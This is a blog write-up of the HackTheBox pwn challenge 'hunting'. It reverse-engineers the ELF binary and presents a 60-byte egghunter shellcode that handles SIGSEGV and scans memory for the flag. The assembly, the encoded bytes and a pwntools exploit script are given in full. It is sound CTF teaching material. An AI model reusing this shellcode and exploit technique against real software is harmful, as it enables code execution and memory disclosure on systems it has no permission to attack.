---
layout: single
title: "An alternative approach to HTB hunting"
tags: HTB pwn exploitation flag
category: Pwn
header:
  image: /assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/Teaser.PNG
  caption: "Picture credit: Me"
  teaser: /assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/Teaser.PNG
---

Welcome back to my first writeup published on my website.

This time I need to solve the first <b style="color:red">PWN</b> challenge offered by *HackTheBox*: **hunting**.

![Hunting description](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/Intro.PNG "Hunting Description")

This challenge, reachable [here](https://app.hackthebox.com/challenges/hunting), shows up with an executable, an
*ELF* executable. Let's analyze it to get an idea about this stuff. 

> <div style="display: flex; justify-content: between; align-items: center;"><div style="padding: 0.5rem;"><i class="far fa-sticky-note" style="color: #fab005; padding: 0.7rem; border-radius: 100%"></i></div><div style="padding: 0.5rem;"><b style="font-style: normal">Challenge title is quite often an initial hint to its resolution: we probably have to hunt for something.</b></div></div>

![file hunting](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/file.PNG "file hunting")

![checksec hunting](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/checksec.PNG "checksec hunting")

In this case I ran *file* and *checksec* utilities: the first one showed me that we have to deal with a 32-bit executable, dynamically linked but stripped. The last one made me understand the protections enabled for this ELF file: we only have <i style="color: darkblue">PIE</i> enabled.

With this things in mind, let's start the executable (I trust HTB 😂). I immediately notice a *SEGFAULT* after entering some characters:

![SEGFAULT1](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/SEGFAULT1.PNG "Segmentation Fault 1")

By inspecting executable through *GDB pwndbg* and listing functions through `info functions`, I remember that it's stripped, so I type `start` to explore it from the beginning. After several `si` and `ni` I hit *main* function.

![snippet1](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/snippet1.PNG "ASM main function Snippet")

After some investigation let's recap main actions this executable does:
> 1. `open ("/dev/urandom", O_RDONLY, ...) -> 3`: open *urandom device* for Random Number Generation
2. `read (3, buf, 8)`: read 8 bytes from */dev/urandom* using its opened *file descriptor*
3. (`close (3)`: close fd 3)
4. (`srand (seed)`: use previously generated random bytes to set the *seed*)
5. `rand()`: generate random bytes between *0x5fffffff* and *0xf7000000*
6. `signal (0xe, exit)`: when program receives 0xe signal, it exits
7. `alarm (0xa)`: after 10 seconds program automatically will generate a 0xe signal
8. `mmap (addr, 0x1000, ...)`: map previously generated address into virtual address space
9. `strcpy (addr, "HTB{XXX}")`: store flag in that address
10. `memset (HTBoldaddr, "\0", 0x25)`: zero fill old flag memory location
11. `read (STDIN, buf, 0x3c)`: read 60 bytes
12. `call rax`: call our shellcode

In short terms it stores the flag in a random location between *0x5fffffff* and *0xf7000000* and executes the shellcode we put into.

Now we need a strategy to get the right address, the one which stores the flag. We can bruteforce it: knowing the range it is much easier to guess it. But if we try to fetch data from unmapped memory, we'll throw a SEGFAULT.

Now there are two possible strategies:

> <div style="display: flex; justify-content: between; align-items: center;"><div style="padding: 0.5rem;"><i class="fas fa-lightbulb" style="color: #ffd43b; padding: 0.7rem; border-radius: 100%"></i></div><div style="padding: 0.5rem;"><b style="font-style: normal">When I solved it I (obviously) thought of the harder one before 😂.</b></div></div>

- Call `access` syscall for each address until it becomes valid
- Try each address and register a new signal handler for SEGFAULT that continues execution instead of stopping it

After a lot of hard work and mind blowing thoughts to make shellcode fits in 60 bytes, this is my final ASM shellcode  that covers the 2nd case (at the time I didn't notice address range, so I guessed based on insight). First method is well explained [here](https://shakuganz.com/2021/07/14/hackthebox-hunting-write-up/). It searches for addresses from 0x**6000**0000 to 0x**ffff**0000 (knowing upper boundaries of the address I knew it would stop before the end):

> <div style="display: flex; justify-content: between; align-items: center;"><div style="padding: 0.5rem;"><i class="fas fa-lightbulb" style="color: #ffd43b; padding: 0.7rem; border-radius: 100%"></i></div><div style="padding: 0.5rem;"><b style="font-style: normal">It sets a custom signal handler for SISSEGV (0xb)
and tries the address. It iterates this sequence of steps for every address starting from 0x60000000, until he find
the starting characters of the flag.</b></div></div>

{% highlight nasm %}
global _start

_start:
mov    esi,0x60000000
call   0xa
pop    ecx
sub    ecx,0x5
mov    eax,0x30
mov    ebx,0xb
int    0x80
ror    esi,0x10
inc    esi
rol    esi,0x10
mov    edi,DWORD PTR [esi]
cmp    di,0x5448
jne    0x10
mov    edx,0x25
mov    ecx,esi
xor    ebx,ebx
inc    ebx
mov    eax,0x4
int    0x80
{% endhighlight %}

Let's inspect this shellcode step by step.

It can be divided into four parts:
1.  **Initialization of registers (aka "setting up variables")**
  - `mov    esi,0x60000000`: move into ECX register address to start the search from

2.  **Registration of SISSEGV handler using `signal` syscall**
  - `call   0xa`: call next instruction; it does *push rip; jmp addr*
  - `pop    ecx`: store current instruction in ECX; by popping previously saved address, *signal* function handler will be stored here
  - `sub    ecx, 0x5`: subtract 0x5 from ecx; now it references `call 0xa` instruction
  - `mov    eax, 0x30`: syscall number in EAX
  - `mov    ebx,0xb`: *signal* number to override
  - `int    0x80`: interrupt for system call

3.  **Attempt to dereference address in ECX**
  - `ror    esi,0x10`: set lower nibble of ESI; I needed this instruction to allow me to increment it
  - `inc    esi`: increment ESI by one; from *0x6000-0000* to *0x0000-6000* to *0x0000-6001*
  - `rol    esi,0x10`: set higher nibble of ESI; eg. from *0x0000-6000* to *0x6000-0000*
  - `mov    edi,DWORD PTR [esi]`: attempt to dereference esi
  - `cmp    di,0x5448`: if it succeeds, search for string 'HT' in *little-endian*
  - `jne    0x10`: jmp to phase 1 if the above condition is false
4. **If it's valid write its content**
  - `mov    edx,0x25`: number of bytes to write
  - `mov    ecx,esi`: buffer pointer
  - `xor    ebx,ebx`: zero fill EBX
  - `inc    ebx`: increments EBX to match STDOUT fd
  - `mov    eax,0x4`: *write* syscall
  - `int    0x80`: interrupt 0x80


And this is the script, written in Python3 with *pwntools*, to exploit it (I tested it locally before, then remotely):

{% highlight python %}
#!/usr/bin/python3

from pwn import *

p = process('./hunting')

p.sendline("\xbe\x00\x00\x00\x60\xe8\x00\x00\x00\x00\x59\x83\xe9\x05\xb8\x30\x00\x00\x00\xbb\x0b\x00\x00\x00\xcd\x80\xc1\xce\x10\x46\xc1\xc6\x10\x8b\x3e\x66\x81\xff\x48\x54\x75\xe6\xba\x25\x00\x00\x00\x89\xf1\x31\xdb\x43\xb8\x04\x00\x00\x00\xcd\x80")
p.interactive()
{% endhighlight %}

![result hunting](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/result.PNG "result hunting")

![remote hunting](/assets/images/posts/2022-09-01-an-alternative-approach-to-htb-hunting/remote.PNG "remote hunting")

I think the simplest technique was the *access & egghunter* one, but in the end I prefer this!
